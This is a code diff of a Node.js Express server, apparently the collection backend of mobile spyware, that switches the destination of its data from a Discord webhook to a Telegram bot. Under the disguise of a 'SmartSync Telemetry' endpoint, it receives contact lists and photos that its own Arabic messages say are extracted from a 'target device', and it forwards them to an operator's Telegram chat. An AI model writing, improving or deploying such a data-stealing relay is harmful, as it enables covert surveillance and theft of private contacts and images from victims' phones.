@@ -1,109 +1,81 @@
 const express = require('express');
 const axios = require('axios');
+const FormData = require('form-data');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// زيادة الحجم المسموح لاستقبال صور Base64 الكبيرة
-app.use(express.json({ limit: '15mb' }));
+app.use(express.json({ limit: '25mb' }));
 
-const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-async function retryWithBackoff(fn, retries = 3, delay = 1000) {
+async function sendToTelegram(payloadType, data) {
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+        console.warn('Telegram credentials are not set.');
+        return;
+    }
+
+    const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+
     try {
-        return await fn();
+        if (payloadType === 'contacts') {
+            let text = `👥 **تقرير جهات الاتصال (${data.length} عنصر)**\n\n`;
+            text += data.map(c => `👤 <b>${c.name || 'بدون اسم'}</b>\n📞 <code>${c.phone || 'بدون رقم'}</code>`).join('\n\n');
+            
+            if (text.length > 4000) text = text.substring(0, 4000) + '...';
+
+            await axios.post(`${apiUrl}/sendMessage`, {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: text,
+                parse_mode: 'HTML'
+            });
+        } 
+        else if (payloadType === 'photo') {
+            const base64Image = data[0].photo_chunk;
+            const assetId = data[0].asset_id || 'N/A';
+            const buffer = Buffer.from(base64Image, 'base64');
+
+            const form = new FormData();
+            form.append('chat_id', TELEGRAM_CHAT_ID);
+            form.append('photo', buffer, { filename: 'photo.jpg', contentType: 'image/jpeg' });
+            form.append('caption', `🖼️ **صورة جديدة مستخرجة بجودة عالية**\n- Asset ID: <code>${assetId}</code>`);
+            form.append('parse_mode', 'HTML');
+
+            await axios.post(`${apiUrl}/sendPhoto`, form, {
+                headers: form.getHeaders(),
+                maxContentLength: Infinity,
+                maxBodyLength: Infinity
+            });
+        }
     } catch (error) {
-        if (retries <= 0) throw error;
-        console.warn(`⚠️ فشل الاتصال، إعادة المحاولة خلال ${delay / 1000} ثوانٍ... الخطأ: ${error.message}`);
-        await new Promise(resolve => setTimeout(resolve, delay));
-        return retryWithBackoff(fn, retries - 1, delay * 2);
+        console.error('❌ خطأ في إرسال البيانات لتيليجرام:', error.response?.data || error.message);
     }
 }
 
 app.post('/api/telemetry', async (req, res) => {
     try {
         const body = req.body;
-
         if (!body || (Array.isArray(body) && body.length === 0) || Object.keys(body).length === 0) {
-            return res.status(400).json({ error: 'Payload is empty or invalid JSON.' });
+            return res.status(400).json({ error: 'Empty payload.' });
         }
 
-        let discordPayload = {};
-
-        // 1. معالجة الصور المرسلة بصيغة Base64 وعرضها كمعاينة مرئية مباشرة في ديسكورد
         if (Array.isArray(body) && body.length > 0 && body[0].photo_chunk) {
-            const base64Image = body[0].photo_chunk;
-            discordPayload = {
-                content: `📸 **تم استلام صورة جديدة بدقة عالية وعرضها مباشرة من الجهاز المستهدف!**`,
-                embeds: [
-                    {
-                        title: `🖼️ معاينة الصورة المستخرجة (Asset ID: ${body[0].asset_id || 'N/A'})`,
-                        color: 3066993,
-                        image: {
-                            url: `data:image/jpeg;base64,${base64Image}`
-                        },
-                        timestamp: new Date().toISOString(),
-                        footer: { text: 'SmartSync Telemetry - Live Visual' }
-                    }
-                ]
-            };
-        } 
-        // 2. معالجة جهات الاتصال
-        else if (Array.isArray(body)) {
-            let descriptionText = body.map(c => `👤 **${c.name || 'بدون اسم'}**\n📞 \`${c.phone || 'بدون رقم'}\``).join('\n\n');
-            if (descriptionText.length > 4000) descriptionText = descriptionText.substring(0, 4000) + '...';
-
-            discordPayload = {
-                embeds: [
-                    {
-                        title: `👥 تقرير مزامنة جهات الاتصال الفريدة (${body.length} عنصر)`,
-                        color: 3066993,
-                        description: descriptionText,
-                        footer: { text: 'SmartSync Telemetry - Contacts Module' }
-                    }
-                ]
-            };
-        } 
-        // 3. بيانات عامة
-        else {
-            discordPayload = {
-                embeds: [
-                    {
-                        title: `📊 تقرير تشخيص عام`,
-                        color: 3066993,
-                        description: `\`\`\`json\n${JSON.stringify(body, null, 2).substring(0, 1900)}\`\`\``,
-                        footer: { text: 'SmartSync Telemetry' }
-                    }
-                ]
-            };
+            await sendToTelegram('photo', body);
+        } else if (Array.isArray(body)) {
+            await sendToTelegram('contacts', body);
         }
 
-        if (DISCORD_WEBHOOK_URL) {
-            await retryWithBackoff(
-                () => axios.post(DISCORD_WEBHOOK_URL, discordPayload),
-                3,
-                1000
-            );
-        } else {
-            console.warn('DISCORD_WEBHOOK_URL is not set in environment variables.');
-        }
-
-        return res.status(200).json({ success: true, message: 'Telemetry processed and sent to Discord.' });
-
+        return res.status(200).json({ success: true, message: 'Forwarded to Telegram.' });
     } catch (error) {
-        console.error('❌ فشل إرسال التقرير إلى ديسكورد:', error.message);
-        return res.status(500).json({ 
-            success: false, 
-            error: 'Internal Server Error while processing telemetry after retries.',
-            details: error.message 
-        });
+        return res.status(500).json({ success: false, error: error.message });
     }
 });
 
 app.get('/health', (req, res) => {
-    res.status(200).json({ status: 'UP', service: 'telemetry-webhook-service' });
+    res.status(200).json({ status: 'UP', service: 'telegram-telemetry-service' });
 });
 
 app.listen(PORT, () => {
-    console.log(`Telemetry microservice is running on port ${PORT}`);
+    console.log(`Telegram telemetry service is running on port ${PORT}`);
 });
